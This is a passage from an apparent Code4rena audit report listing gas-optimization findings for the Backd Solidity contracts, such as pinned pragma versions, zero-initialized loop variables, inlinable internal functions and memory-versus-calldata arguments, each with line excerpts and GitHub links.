0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #10\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L2\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #11\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L2\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #12\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L2\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #13\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L2\r\n\r\n```solidity\r\nFile: contracts/GasBank.sol   #14\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol#L2\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #15\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L2\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkOracleProvider.sol   #16\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkOracleProvider.sol#L2\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #17\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L2\r\n\r\n```solidity\r\nFile: contracts/oracles/OracleProviderExtensions.sol   #18\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/OracleProviderExtensions.sol#L2\r\n\r\n```solidity\r\nFile: contracts/pool/Erc20Pool.sol   #19\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/Erc20Pool.sol#L2\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol   #20\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol#L2\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #21\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L2\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #22\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L2\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #23\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L2\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #24\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L2\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #25\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L2\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #26\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L2\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #27\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L2\r\n\r\n```solidity\r\nFile: contracts/utils/CvxMintAmount.sol   #28\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/CvxMintAmount.sol#L2\r\n\r\n```solidity\r\nFile: contracts/utils/Pausable.sol   #29\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Pausable.sol#L2\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #30\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L2\r\n\r\n```solidity\r\nFile: contracts/vault/Erc20Vault.sol   #31\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol#L2\r\n\r\n```solidity\r\nFile: contracts/vault/EthVault.sol   #32\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol#L2\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol   #33\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L2\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #34\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L2\r\n\r\n```solidity\r\nFile: contracts/vault/VaultStorage.sol   #35\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultStorage.sol#L2\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #36\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L2\r\n\r\n```solidity\r\nFile: libraries/AddressProviderMeta.sol   #37\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderMeta.sol#L2\r\n\r\n```solidity\r\nFile: libraries/Errors.sol   #38\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/Errors.sol#L2\r\n\r\n```solidity\r\nFile: libraries/ScaledMath.sol   #39\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/ScaledMath.sol#L2\r\n\r\n### 13. Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #1\r\n\r\n123         require(totalClaimable > 0, Error.NOTHING_TO_CLAIM);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L123\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #2\r\n\r\n401         require(_depositCap > 0, Error.INVALID_AMOUNT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L401\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #3\r\n\r\n471         require(underlyingAmount > 0, Error.INVALID_AMOUNT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L471\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #4\r\n\r\n549         require(redeemLpTokens > 0, Error.INVALID_AMOUNT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L549\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #5\r\n\r\n164         require(amount > 0, Error.INVALID_AMOUNT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L164\r\n\r\n### 14. It costs more gas to initialize variables to zero than to let the default of zero be applied\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #1\r\n\r\n80         for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L80\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n135         for (uint256 i = 0; i < assets.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L135\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #3\r\n\r\n61         for (uint256 i = 0; i < ctokens.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L61\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n188         for (uint256 i = 0; i < protocols.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L188\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #5\r\n\r\n452         uint256 totalEthRequired = 0;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L452\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n456         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L456\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #7\r\n\r\n479         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L479\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #8\r\n\r\n506         for (uint256 i = 0; i < howMany; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L506\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #9\r\n\r\n891         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L891\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #10\r\n\r\n43             for (uint256 i = 0; i < users.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L43\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #11\r\n\r\n46                 for (uint256 j = 0; j < positions.length; j++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L46\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #12\r\n\r\n72         for (uint256 i = 0; i < keys.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L72\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #13\r\n\r\n93         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L93\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #14\r\n\r\n165         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L165\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #15\r\n\r\n114         uint256 totalEthRequired = 0;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L114\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #16\r\n\r\n117         for (uint256 i = 0; i < numActions; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L117\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #17\r\n\r\n483         uint256 currentFeeRatio = 0;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L483\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #18\r\n\r\n144         uint256 startingAllowance = 0;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L144\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #19\r\n\r\n260         for (uint256 i = 0; i < actions.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L260\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #20\r\n\r\n313         for (uint256 i = 0; i < _rewardTokens.length(); i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L313\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #21\r\n\r\n380         for (uint256 i = 0; i < _rewardTokens.length(); i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L380\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #22\r\n\r\n135             uint256 allocatedUnderlying = 0;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L135\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #23\r\n\r\n583         uint256 strategistShare = 0;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L583\r\n\r\n### 15. `internal` functions only called once can be inlined to save gas\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #1\r\n\r\n105     function _repayAnyDebt(\r\n106         address account,\r\n107         address underlying,\r\n108         uint256 maximum,\r\n109         CToken ctoken\r\n110     ) internal returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L105-L110\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n128     function _getAccountBorrowsAndSupply(address account) internal view returns (uint256, uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L128\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #3\r\n\r\n840     function _payFees(\r\n841         address payer,\r\n842         address beneficiary,\r\n843         uint256 feeAmount,\r\n844         address depositToken\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L840-L844\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n861     function _lockFunds(\r\n862         address payer,\r\n863         address token,\r\n864         uint256 lockAmount,\r\n865         uint256 depositAmount\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L861-L865\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #5\r\n\r\n884     function _removeUserPosition(\r\n885         address payer,\r\n886         bytes32 account,\r\n887         bytes32 protocol\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L884-L887\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n906     function _approve(address token, address spender) internal {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L906\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #7\r\n\r\n914     function _calcExchangeAmount(\r\n915         address token,\r\n916         address actionToken,\r\n917         uint256 amount\r\n918     ) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L914-L918\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #8\r\n\r\n922     function _getSwapper(address underlying, address actionToken) internal view returns (ISwapper) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L922\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #9\r\n\r\n932     function _isSwappable(address depositToken, address toToken) internal view returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L932\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #10\r\n\r\n422     function _addKnownAddressKey(bytes32 key, AddressProviderMeta.Meta memory meta) internal {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L422\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #11\r\n\r\n273     function _stakeCvxCrv() internal returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L273\r\n\r\n```solidity\r\nFile: contracts/pool/Erc20Pool.sol   #12\r\n\r\n38     function _getBalanceUnderlying() internal view override returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/Erc20Pool.sol#L38\r\n\r\n```solidity\r\nFile: contracts/pool/Erc20Pool.sol   #13\r\n\r\n42     function _getBalanceUnderlying(bool) internal view override returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/Erc20Pool.sol#L42\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol   #14\r\n\r\n33     function _getBalanceUnderlying() internal view override returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol#L33\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol   #15\r\n\r\n37     function _getBalanceUnderlying(bool transferInDone) internal view override returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol#L37\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #16\r\n\r\n130     function _minLpAccepted(uint256 _underlyingAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L130\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #17\r\n\r\n139     function _maxLpBurned(uint256 _underlyingAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L139\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #18\r\n\r\n148     function _minUnderlyingAccepted(uint256 _lpAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L148\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #19\r\n\r\n146     function _deposit() internal override returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L146\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #20\r\n\r\n242     function _minLpAccepted(uint256 _hopLpAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L242\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #21\r\n\r\n251     function _maxLpBurned(uint256 _hopLpAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L251\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #22\r\n\r\n260     function _minHopLpAcceptedFromWithdraw(uint256 _lpAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L260\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #23\r\n\r\n269     function _minHopLpAcceptedFromDeposit(uint256 _underlyingAmount)\r\n270         internal\r\n271         view\r\n272         returns (uint256)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L269-L272\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #24\r\n\r\n285     function _maxHopLpBurned(uint256 _underlyingAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L285\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #25\r\n\r\n297     function _minUnderlyingAccepted(uint256 _hopLpAmount) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L297\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #26\r\n\r\n227     function _tokenToWethAmountOut(address token_, uint256 amount_)\r\n228         internal\r\n229         view\r\n230         returns (uint256)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L227-L230\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #27\r\n\r\n257     function _wethToTokenAmountOut(address token_, uint256 amount_)\r\n258         internal\r\n259         view\r\n260         returns (uint256)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L257-L260\r\n\r\n### 16. Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #1\r\n\r\n73     function hasAnyRole(bytes32[] memory roles, address account)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L73\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol   #2\r\n\r\n40         bytes memory extra\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L40\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol   #3\r\n\r\n69     function getUserFactor(bytes32 account, bytes memory) external view override returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L69\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #4\r\n\r\n54         bytes memory extra\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L54\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #5\r\n\r\n90     function getUserFactor(bytes32 account, bytes memory) external view override returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L90\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n207         Record memory record\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L207\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #7\r\n\r\n29         string memory name_,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L29\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #8\r\n\r\n30         string memory symbol_,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L30\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol   #9\r\n\r\n13         string memory name_,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol#L13\r\n\r\n### 17. `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too)\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #1\r\n\r\n80         for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L80\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n135         for (uint256 i = 0; i < assets.length; i++) 